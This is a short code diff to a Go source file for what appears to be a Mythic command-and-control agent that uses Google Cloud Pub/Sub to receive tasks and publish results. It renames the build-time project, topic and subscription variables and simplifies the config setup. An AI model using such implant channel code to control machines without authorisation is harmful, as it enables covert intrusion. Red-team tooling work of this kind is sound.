@@ -112,11 +112,9 @@ var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KH
 var verbose = "false"
 
 // PubSub-specific variables (injected at build time by Mythic)
-var gcpProjectID = ""
-var serverToAgentTopic = ""
-var agentToServerTopic = ""
-var serverToAgentSub = ""
-var agentToServerSub = ""
+var projectID = ""
+var resultsTopic = ""
+var tasksSubscription = ""
 var credentialsJSON = ""
 var encryptionMode = "" // "aes256_hmac", "rsa", or "none"
 
@@ -243,12 +241,12 @@ func main() {
 		var pubsubConfig Config
 
 		// Check if build-time variables are set (Mythic build) or use config file (standalone build)
-		if gcpProjectID != "" && serverToAgentTopic != "" && agentToServerTopic != "" {
-			// Build-time variables injected by Mythic - use them
+		if projectID != "" && resultsTopic != "" && tasksSubscription != "" {
+			// Build-time variables injected by Mythic
 			pubsubConfig = Config{
-				ProjectID:       gcpProjectID,
-				ResultsTopic:    agentToServerTopic, // Agent publishes results here
-				SubscriptionID:  serverToAgentSub,   // Agent subscribes to tasks
+				ProjectID:       projectID,
+				ResultsTopic:    resultsTopic,
+				SubscriptionID:  tasksSubscription,
 				CredentialsJSON: credentialsJSON,
 			}
 			if core.Verbose {
